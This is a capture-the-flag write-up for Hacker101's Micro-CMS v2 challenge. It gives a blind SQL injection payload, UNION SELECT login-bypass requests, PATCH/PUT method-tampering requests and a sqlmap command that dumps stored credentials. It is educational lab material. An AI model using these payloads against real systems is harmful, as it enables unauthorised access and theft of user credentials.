# Micro-CMS v2

## Challenge Information
- Category: Web
- Difficulty: Medium
- Platform: Hacker101
- Points: 3 (3 flags)

## Challenge Description
> Micro-CMS v2 is a content management system with user authentication. By default, users need to be an admin to add or edit pages.

## Initial Analysis
- The app has pages at `/page/N` with numeric IDs (same as v1) and a login page at `/login`.
- Unlike v1, creating/editing pages requires admin authentication.
- The login form has `username` and `password` fields — SQL injection target.
- Hints suggest three different attack vectors: UNION injection, HTTP method tampering, and credential extraction from the database.

## Enumeration

### Step 1 — Map endpoints

```
/           → 200 (homepage, public pages listed)
/page/1     → 200 (public)
/page/2     → 200 (public)
/page/create → redirects to /login (needs auth)
/login      → 200 (login form, POST to authenticate)
```

### Step 2 — Test SQL injection

The `username` parameter is vulnerable to time-based blind SQLi (confirmed by sqlmap). Backend is MySQL/MariaDB.

```
Parameter: username (POST)
Type: time-based blind
Payload: username=admin' AND (SELECT 9893 FROM (SELECT(SLEEP(5)))wVCE)-- -
```

## Exploitation

### Flag 0 — UNION SQL Injection

**Hint:** *"More perfect union"*

Bypass authentication using a UNION SELECT payload.

**Step 1 — Find column count with ORDER BY:**
```
POST /login
Content-Type: application/x-www-form-urlencoded

username=' ORDER BY 1-- -&password=x
```

Increment the number until the response changes (no error → correct count).

**Step 2 — UNION SELECT bypass:**
```
POST /login
Content-Type: application/x-www-form-urlencoded

username=' UNION SELECT 1,2-- -&password=x
```

If the column count is correct, the login succeeds and the flag is in the response.

---

### Flag 1 — HTTP Method Tampering

**Hints:**
- *"Just because request fails with one method doesn't mean it will fail with a different method"*
- *"Different requests often have different required authorization"*

POST requests to create/edit pages are blocked for non-admins, but other HTTP methods (PUT, PATCH, DELETE) are not properly checked.

**Step 1 — Log in** (via UNION bypass from Flag 0 or credentials from Flag 2).

**Step 2 — Capture the session cookie** from the response.

**Step 3 — Modify a page using an alternative method:**
```http
PATCH /page/1 HTTP/1.1
Cookie: <session>
```
or create a new page:
```http
PUT /page/create HTTP/1.1
Cookie: <session>
Content-Type: application/x-www-form-urlencoded

title=x&body=x
```

The flag is returned in the response.

---

### Flag 2 — Database Credential Dump

**Hint:** *"Credentials are secret, flags are secret — coincidence?"*

The password stored in the database **is** the flag itself.

**Step 1 — Dump the database with sqlmap:**
```bash
sqlmap -u "https://<instance>.ctf.hacker101.com/login" \
  --data="username=admin&password=admin" \
  --level=3 --dump --batch --time-sec=1 --threads=10 --no-cast --no-escape
```

**Step 2 —** sqlmap extracts the users table. The password field contains the flag.

**Step 3 —** These credentials (e.g., `vilma:<flag_value>`) also work for normal login.

## Flags

| Flag | Technique | Difficulty |
|------|-----------|------------|
| Flag 0 | UNION SQLi login bypass | Easy |
| Flag 1 | HTTP Method Tampering | Medium |
| Flag 2 | sqlmap credential dump | Easy-Medium |

## Tools Used
- **Burp Suite** — HTTP interception, Repeater for payload testing
- **sqlmap** — Automated SQL injection and database extraction
- **curl** — Quick manual request testing
